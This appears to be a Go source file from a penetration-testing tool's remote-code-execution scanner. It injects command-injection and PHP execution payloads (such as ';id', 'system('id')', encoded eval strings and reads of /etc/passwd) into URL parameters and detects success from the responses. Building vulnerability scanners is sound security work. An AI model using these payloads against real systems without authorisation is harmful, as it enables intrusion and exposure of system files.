package scanners

import (
	"regexp"
	"strings"
	"time"

	"github.com/cc1a2b/PenHunter/types"
)

type RCEScanner struct {
	*BaseScanner
	payloads []string
}

func NewRCEScanner(encoders []string) *RCEScanner {
	payloads := []string{
		"$(id)",
		"`id`",
		";id",
		"|id",
		"&&id",
		"||id",
		"phpinfo()",
		"system('id')",
		"exec('id')",
		"passthru('id')",
		"shell_exec('id')",
		"eval('id')",
		"assert('id')",
		"file_get_contents('/etc/passwd')",
		"readfile('/etc/passwd')",
		"fopen('/etc/passwd','r')",
		"fread(fopen('/etc/passwd','r'),filesize('/etc/passwd'))",
		"base64_decode('c3lzdGVtKCJpZCIp')",
		"eval(base64_decode('c3lzdGVtKCJpZCIp'))",
		"assert(base64_decode('c3lzdGVtKCJpZCIp'))",
	}

	return &RCEScanner{
		BaseScanner: NewBaseScanner("RCE", "critical", encoders),
		payloads:    payloads,
	}
}

func (r *RCEScanner) Payloads() []string {
	return r.payloads
}

// DetectRCE checks for command execution with baseline comparison to reduce false positives
func (r *RCEScanner) DetectRCE(resp *types.HttpResponse, baselineBody string, payload string) bool {
	body := string(resp.Body)
	bodyLower := strings.ToLower(body)
	baselineLower := strings.ToLower(baselineBody)

	// Check for `id` command output - very specific pattern
	if strings.Contains(payload, "id") {
		// Pattern: uid=XXX(user) gid=XXX(group)
		idPattern := regexp.MustCompile(`uid=\d+\([^)]+\)\s*gid=\d+\([^)]+\)`)
		if idPattern.MatchString(body) && !idPattern.MatchString(baselineBody) {
			return true
		}
	}

	// Check for /etc/passwd content from command execution
	if strings.Contains(payload, "passwd") || strings.Contains(payload, "file_get_contents") {
		passwdPattern := regexp.MustCompile(`root:x:0:0:[^:]*:[^:]*:`)
		if passwdPattern.MatchString(body) && !passwdPattern.MatchString(baselineBody) {
			return true
		}
	}

	// PHPInfo detection - specific to PHP code execution
	if strings.Contains(payload, "phpinfo") {
		phpInfoPattern := regexp.MustCompile(`<title>phpinfo\(\)</title>|PHP Version \d+\.\d+\.\d+`)
		if phpInfoPattern.MatchString(body) && !phpInfoPattern.MatchString(baselineBody) {
			return true
		}
		// Check for PHP configuration tables
		if strings.Contains(body, "PHP Core") && strings.Contains(body, "Directive") && !strings.Contains(baselineBody, "PHP Core") {
			return true
		}
	}

	// Check for system command output (whoami, hostname, etc.)
	// These should appear in response but not in baseline
	cmdOutputIndicators := []string{
		"uid=",
		"gid=",
		"groups=",
	}
	for _, indicator := range cmdOutputIndicators {
		if strings.Contains(bodyLower, indicator) && !strings.Contains(baselineLower, indicator) {
			return true
		}
	}

	return false
}

func (r *RCEScanner) Detect(resp *types.HttpResponse) bool {
	body := string(resp.Body)

	// Only very strong indicators for fallback
	// Pattern for id command output
	idPattern := regexp.MustCompile(`uid=\d+\([^)]+\)\s*gid=\d+`)
	if idPattern.MatchString(body) {
		return true
	}

	// PHPInfo specific
	phpPattern := regexp.MustCompile(`<title>phpinfo\(\)</title>`)
	if phpPattern.MatchString(body) {
		return true
	}

	return false
}

func (r *RCEScanner) Scan(targetURL string, client types.HttpClient) []*types.Finding {
	var findings []*types.Finding
	seenVulns := make(map[string]bool)

	if !r.hasParameter(targetURL) {
		return findings
	}

	params := r.extractParameters(targetURL)
	if len(params) == 0 {
		return findings
	}

	// Get baseline response for comparison
	baselineResp, _ := client.Get(targetURL, nil)
	baselineBody := ""
	if baselineResp != nil {
		baselineBody = string(baselineResp.Body)
	}

	for _, payload := range r.payloads {
		variants := r.mutatePayload(payload)

		for _, variant := range variants {
			for _, param := range params {
				parts := strings.SplitN(param, "=", 2)
				if len(parts) != 2 {
					continue
				}

				paramName := parts[0]

				// Skip if already found vuln for this param
				vulnKey := targetURL + "|" + paramName
				if seenVulns[vulnKey] {
					continue
				}

				injectedURL := r.injectPayload(targetURL, variant)

				resp, err := client.Get(injectedURL, nil)
				if err != nil {
					continue
				}

				// Use improved detection with baseline comparison
				if r.DetectRCE(resp, baselineBody, variant) {
					evidence := r.extractEvidence(string(resp.Body), variant)
					confidence := 0.95

					finding := r.createFinding(
						injectedURL,
						paramName,
						variant,
						evidence,
						confidence,
						resp.StatusCode,
						string(resp.Body),
					)

					findings = append(findings, finding)
					seenVulns[vulnKey] = true
				}

				time.Sleep(50 * time.Millisecond)
			}
		}
	}

	return findings
}

func (r *RCEScanner) extractEvidence(body, payload string) string {
	indicators := []string{
		"uid=",
		"gid=",
		"PHP Version",
		"phpinfo()",
	}

	for _, indicator := range indicators {
		if idx := strings.Index(body, indicator); idx != -1 {
			start := idx - 50
			if start < 0 {
				start = 0
			}
			end := idx + 200
			if end > len(body) {
				end = len(body)
			}
			return body[start:end]
		}
	}

	return "Command execution detected"
}
